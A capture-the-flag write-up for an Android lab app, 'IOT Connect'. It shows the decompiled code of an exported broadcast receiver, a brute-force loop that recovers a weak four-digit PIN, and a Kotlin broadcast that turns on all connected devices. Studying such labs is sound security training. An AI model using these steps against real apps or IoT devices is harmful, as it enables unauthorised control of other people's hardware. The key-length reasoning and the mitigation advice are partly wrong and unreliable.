# Introduction

Welcome to the "IOT Connect" Broadcast Receiver Exploitation Challenge! Immerse yourself in the world of cybersecurity with this hands-on lab. This challenge focuses on exploiting a security flaw related to the broadcast receiver in the "IOT Connect" application, allowing unauthorized users to activate the master switch, which can turn on all connected devices. The goal is to send a broadcast in a way that only authenticated users can trigger the master switch.


# Information

## JADX RE

With services and broadcast we can first check AndroidManifest.xml file, where android:exported="true" is in most cases an attackable surface. 

```
<receiver
            android:name="com.mobilehackinglab.iotconnect.MasterReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="MASTER_ON"/>
            </intent-filter>
        </receiver>
```

We can see that the MasterReceiver is exported and uses an intent-filter *"MASTER_ON"*. 

Upon searching "MASTER_ON" in JADX, we can see that CommunicationManager initializes a broadcast receiver. 

```
public final BroadcastReceiver initialize(Context context) {
        Intrinsics.checkNotNullParameter(context, "context");
        masterReceiver = new BroadcastReceiver() { // from class: com.mobilehackinglab.iotconnect.CommunicationManager.initialize.1
            @Override // android.content.BroadcastReceiver
            public void onReceive(Context context2, Intent intent) {
                if (Intrinsics.areEqual(intent != null ? intent.getAction() : null, "MASTER_ON")) {
                    int key = intent.getIntExtra("key", 0);
                    if (context2 != null) {
                        if (Checker.INSTANCE.check_key(key)) {
                            CommunicationManager.INSTANCE.turnOnAllDevices(context2);
                            Toast.makeText(context2, "All devices are turned on", 1).show();
                        } else {
                            Toast.makeText(context2, "Wrong PIN!!", 1).show();
                        }
                    }
                }
            }
        };
```

Next, we can see that the only condition we have to satisfy is to set "MASTER_ON" action on intent. 
Also, we need to set a correct "key" extra data in order to enter 
```
CommunicationManager.INSTANCE.turnOnAllDevices(context2);
```

Key is checked in Checker.check_key method:
```
Checker.INSTANCE.check_key(key)
```

Below is the implementation of Checker.check_key:
```
public final boolean check_key(int key) {
        try {
            return Intrinsics.areEqual(decrypt(ds, key), "master_on");
        } catch (BadPaddingException e) {
            return false;
        }
    }

    public final String decrypt(String ds2, int key) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeyException {
        Intrinsics.checkNotNullParameter(ds2, "ds");
        SecretKeySpec secretKey = generateKey(key);
        Cipher cipher = Cipher.getInstance(algorithm + "/ECB/PKCS5Padding");
        cipher.init(2, secretKey);
        if (Build.VERSION.SDK_INT >= 26) {
            byte[] decryptedBytes = cipher.doFinal(Base64.getDecoder().decode(ds2));
            Intrinsics.checkNotNull(decryptedBytes);
            return new String(decryptedBytes, Charsets.UTF_8);
        }
        throw new UnsupportedOperationException("VERSION.SDK_INT < O");
    }

    private final SecretKeySpec generateKey(int staticKey) {
        byte[] keyBytes = new byte[16];
        byte[] staticKeyBytes = String.valueOf(staticKey).getBytes(Charsets.UTF_8);
        Intrinsics.checkNotNullExpressionValue(staticKeyBytes, "getBytes(...)");
        System.arraycopy(staticKeyBytes, 0, keyBytes, 0, Math.min(staticKeyBytes.length, keyBytes.length));
        return new SecretKeySpec(keyBytes, algorithm);
    }
```


generateKey functions declaers a keyBytes array with with 16 bytes size, which translates into a max 4 number key (the rest will be zeroes for padding). 
```
byte[] keyBytes = new byte[16];
```

This enables us to brute force a pin and get it:

```
for (int i = 0; i <= 9999; i++) {
            try {
                String test = decrypt(ds, i);
                if (test != null && test.equals("master_on")) {
                    System.out.println(i);
                    System.out.println(test);
                }
            }
}
```

Afterwards, we can send a broadcast with something like this: 
```
val intentAction = "MASTER_ON"
val intent = Intent()
intent.setAction(intentAction)
intent.putExtra("key", pin)
sendBroadcast(intent)
```

<img width="1080" height="2400" alt="Screenshot_20260426-224148" src="https://github.com/user-attachments/assets/c9f377bd-af4e-41a2-9200-dd5ba9a21146" />

## Mitigation

Set broadcast receiver exported = false, use 256 byte key...
